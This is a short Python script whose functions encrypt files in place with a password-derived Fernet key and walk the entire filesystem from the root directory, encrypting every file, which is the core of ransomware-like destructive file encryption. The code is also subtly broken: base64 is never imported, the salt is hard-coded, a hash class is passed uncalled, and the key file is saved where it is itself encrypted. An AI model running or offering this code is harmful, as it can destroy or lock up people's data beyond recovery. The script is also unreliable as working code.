import os
import shutil
import getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Encrypt a file
def encrypt_file(file_path, key_path):
    # Generate a key
    password = getpass.getpass("Enter password: ").encode()
    salt = b"salt"
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256,
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    f = Fernet(key)

    # Read the file
    with open(file_path, "rb") as file:
        data = file.read()

    # Encrypt the file
    encrypted_data = f.encrypt(data)

    # Write the encrypted file
    with open(file_path, "wb") as file:
        file.write(encrypted_data)
        
    # Save the key
    with open(key_path, "wb") as key_file:
        key_file.write(key)

# Decrypt a file
def decrypt_file(file_path, key_path):
    # Read the key
    with open(key_path, "rb") as key_file:
        key = key_file.read()
    f = Fernet(key)

    # Read the encrypted file
    with open(file_path, "rb") as file:
        encrypted_data = file.read()

    # Decrypt the file
    data = f.decrypt(encrypted_data)

    # Write the decrypted file
    with open(file_path, "wb") as file:
        file.write(data)

# Encrypt all files in all directories
def encrypt_all_directories():
    key_path = os.path.join(os.getcwd(),"key.key")
    for root, dirs, files in os.walk("/"):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key_path)

# Decrypt all files in all directories
def decrypt_all_directories():
    key_path = os.path.join(os.getcwd(),"key.key")
    for root, dirs, files in os.walk("/"):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key_path)
